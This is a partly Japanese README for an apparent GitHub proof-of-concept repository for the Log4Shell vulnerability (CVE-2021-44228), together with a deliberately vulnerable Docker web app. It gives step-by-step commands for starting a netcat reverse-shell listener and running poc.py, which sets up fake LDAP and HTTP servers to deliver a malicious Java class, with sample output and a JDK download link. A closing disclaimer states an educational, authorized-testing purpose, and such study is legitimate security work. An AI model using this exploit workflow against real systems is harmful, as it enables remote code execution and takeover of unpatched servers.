# log4j-shell-poc
CVE-2021-44228(通称Log4shell)に対するPoC。  
最近、ElasticSearchや Minecraftなどで広く使われている Apacheのロギングライブラリlog4jに新たな脆弱性が発見されました。

このリポジトリでは、脆弱性のあるアプリケーションの例と、その脆弱性を利用したPoCの例を作成しています。

A video showing the exploitation process
----------------------------------------

Vuln Webアプリケーション:

https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4

<br>

Ghidra (Old script):

https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4

<br>

Minecraft PoC (Old script):

https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4


概念実証(PoC)
----------------------

As a PoC we have created a python file that automates the process. 


```bash
pip install -r requirements.txt
```
#### :


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** この作業を行うには、解凍したjavaアーカイブの名前が `jdk1.8.0_20` であり、同じディレクトリにある必要があります。
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/NT25-CTF/log4j-shell-poc-ja

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send Exploit Code Port:1389

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


脆弱性が含まれるアプリケーション
--------------------------

We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.



jdkバージョンの取得
--------------------------------------

Exploitを作成した時点では、どのバージョンのJavaが動作し、どのバージョンが動作しないのかがはっきりしなかったため、Java 8の最も古いバージョンの1つである`java-8u20`で動作させることにしました。

```
> https://drive.google.com/file/d/1r8F3X2e2pCN5Iar62yG4M0H8HuBK_4by/view?usp=sharing
```

アーカイブをダウンロードして解凍すると、`java` といくつかの関連するバイナリが `jdk1.8.0_20/bin` の中にあります。  
**注意：** 動作させるためには、このリポジトリにjdkフォルダを同名で展開するようにしてください。

```
> tar -xf jdk-8u20-linux-x64.tar.gz

> ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

